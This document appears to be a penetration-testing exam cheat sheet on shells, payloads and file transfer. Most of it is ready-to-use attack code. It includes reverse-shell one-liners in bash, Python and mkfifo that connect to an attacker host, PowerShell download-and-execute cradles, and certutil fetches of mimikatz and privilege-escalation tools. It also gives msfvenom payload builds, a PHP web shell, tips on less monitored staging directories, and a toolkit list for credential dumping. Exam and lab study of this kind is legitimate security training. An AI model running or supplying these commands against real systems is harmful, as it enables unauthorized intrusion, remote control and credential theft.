# Shells, Payloads & File Transfer

## Listener habits

Pre-stage listeners for common egress ports:

```bash
# Primary
nc -lvnp 443
nc -lvnp 80
nc -lvnp 53
nc -lvnp 8080

# Or multi with rlwrap for history/arrows
rlwrap nc -lvnp 443
```

**Pick LHOST carefully:** exam VPN IP (`tun0`), not eth0.

```bash
ip -br a show tun0
```

## Reverse shells

### Linux one-liners

```bash
# Bash
bash -i >& /dev/tcp/LHOST/443 0>&1

# Python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("LHOST",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# mkfifo (when bash /dev/tcp is blocked)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc LHOST 443 >/tmp/f
```

### TTY upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
reset
export SHELL=bash
export TERM=xterm-256color
stty rows 40 columns 120
```

### Windows — PowerShell (Nishang-style)

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://LHOST/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress LHOST -Port 8088
```

Or encoded command for restricted contexts (e.g. admin panel script execution):

```bash
# On Kali — produce UTF-16LE base64 for -EncodedCommand
cat payload.ps1 | iconv -f UTF-8 -t UTF-16LE | base64 -w 0
```

```powershell
powershell -EncodedCommand <BASE64>
```

### msfvenom (most used)

```bash
# Windows x64 reverse shell EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f exe -o shell_443.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8080 EXITFUNC=thread -f exe -o shell_8080.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=53  EXITFUNC=thread -f exe -o shell_53.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=80  EXITFUNC=thread -f exe -o shell_80.exe

# Windows formats
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f aspx -o shell.aspx
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f msi -o reverse.msi
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f exe -o met.exe  # know MSF limits

# Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f elf -o shell.elf

# PHP / WAR (fill when needed)
msfvenom -p php/reverse_php LHOST=tun0 LPORT=443 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=443 -f war -o shell.war
```

`EXITFUNC=thread` helps when injecting into unstable hosts/services.

## Hosting files for download

```bash
# Python HTTP (simple)
python3 -m http.server 80

# SMB (Impacket) — great for Windows
impacket-smbserver share $(pwd) -smb2support
# Authenticated share (when guest blocked)
impacket-smbserver share $(pwd) -smb2support -user simon -password 'Password123!'
```

## Windows download techniques

### certutil (classic exam workhorse)

```cmd
certutil -urlcache -f http://LHOST/Rubeus.exe Rubeus.exe
certutil -urlcache -f http://LHOST/PrintSpoofer64.exe PrintSpoofer64.exe
certutil -urlcache -f http://LHOST/winpeas.exe winpeas.exe
certutil -urlcache -f http://LHOST/nc.exe nc.exe
certutil -urlcache -f http://LHOST/chisel.exe chisel.exe
certutil -urlcache -f http://LHOST/mimikatz.exe mimikatz.exe
certutil -urlcache -f http://LHOST/PowerUp.ps1 PowerUp.ps1
certutil -urlcache -f http://LHOST/PowerView.ps1 PowerView.ps1
```

### PowerShell

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://LHOST/script.ps1')
IEX (iwr -uri http://LHOST/pwn.ps1 -usebasicparsing)

# Download file
iwr -uri http://LHOST/tool.exe -outfile tool.exe
(New-Object Net.WebClient).DownloadFile('http://LHOST/tool.exe','C:\Windows\Tasks\tool.exe')
```

### SMB map from Windows

```powershell
# Guest / open share
New-PSDrive -Name share -PSProvider FileSystem -Root \\LHOST\share

# Auth share
$pass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('simon', $pass)
New-PSDrive -Name share -PSProvider FileSystem -Credential $cred -Root \\LHOST\share
copy share:\mimikatz.exe C:\Windows\Tasks\
```

### msiexec

```cmd
msiexec /quiet /qn /i http://LHOST/reverse.msi
```

## Staging directory choices (Windows)

Prefer writable, less monitored paths commonly used in labs:

```text
C:\Windows\Tasks
C:\Windows\Temp
C:\Users\Public
C:\Temp
```

## Web shells (minimal)

PHP example (lab only — prefer reverse shell over sticky webshells):

```php
<?php system($_GET['c']); ?>
```

```bash
curl "http://TARGET/shell.php?c=id"
```

Dangerous privilege-escalation style payloads in webroot (from notes — **only on systems you own**):

```bash
# Illustrative of idea: abusing writable webroot + sudoers — not a default exam path
echo '<?php system("id"); ?>' > shell.php
```

## Stabilizing Windows shells

```cmd
# Fix PATH when tools missing
set PATH=%PATH%;C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0

# Prefer PowerShell host
%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
```

## Catching shells through pivot

When target can only reach a pivot host:

1. Run **chisel / ligolo** reverse tunnel (see [06-pivoting](../06-pivoting/tunneling.md))
2. Point reverse shell at pivot’s internal IP, or
3. Port-forward pivot:local → your listener

## Quick payload decision tree

```text
Have code exec as web user?
  ├─ Linux  → bash/python/mkfifo reverse → TTY upgrade
  └─ Windows
       ├─ powershell available → IEX download cradle or encoded cmd
       ├─ certutil / bitsadmin / iwr → drop EXE
       └─ mssql xp_cmdshell → certutil + shell_443.exe
```

## Pre-built toolkit list

Keep a local `tools/` HTTP root with:

| Tool | Role |
|------|------|
| nc.exe / ncat | Reverse shell helper |
| winPEAS / linpeas | Enum |
| PowerUp / PowerView / PowerUpSQL | Windows / SQL abuse |
| PrintSpoofer / GodPotato / SharpEfsPotato | SeImpersonate |
| Rubeus | Kerberos |
| mimikatz / pypykatz | Creds (use carefully) |
| procdump | LSASS dump without mimikatz binary |
| chisel / ligolo-ng | Pivot |
| RunasCs | Run as other user |
| SeBackupPrivilege DLLs | Backup Operators path |
| SharpHound | AD graph |

Generate shell EXEs for **multiple ports** before the exam starts.
